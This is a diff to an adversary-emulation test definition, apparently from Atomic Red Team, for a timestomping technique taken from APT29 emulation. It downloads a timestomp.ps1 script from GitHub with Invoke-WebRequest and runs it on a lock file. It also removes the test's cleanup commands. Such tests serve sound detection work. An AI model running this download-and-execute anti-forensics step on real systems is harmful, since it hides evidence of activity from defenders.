@@ -209,13 +209,13 @@ atomic_tests:
     file_path:
       description: File path for timestomp payload
       type: string
-      default: $env:appdata\Microsoft
+      default: PathToAtomicsFolder\..\ExternalPayloads
   dependency_executor_name: powershell
   dependencies:
   - description: |
       timestomp.ps1 must be present in #{file_path}.
     prereq_command: |
-      if (Test-Path #{file_path}\timestomp.ps1) {exit 0} else {exit 1}
+      if (Test-Path "#{file_path}\timestomp.ps1") {exit 0} else {exit 1}
     get_prereq_command: |
       Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1"
   - description: |
@@ -223,12 +223,9 @@ atomic_tests:
     prereq_command: |
       if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Path #{file_path}\kxwn.lock -ItemType File
+      New-Item -Path "#{file_path}\kxwn.lock" -ItemType File
   executor:
     command: |
-      import-module #{file_path}\timestomp.ps1
+      import-module "#{file_path}\timestomp.ps1"
       timestomp -dest "#{file_path}\kxwn.lock"
-    cleanup_command: |-
-      Remove-Item #{file_path}\timestomp.ps1 -ErrorAction Ignore
-      Remove-Item #{file_path}\kxwn.lock -ErrorAction Ignore
     name: powershell
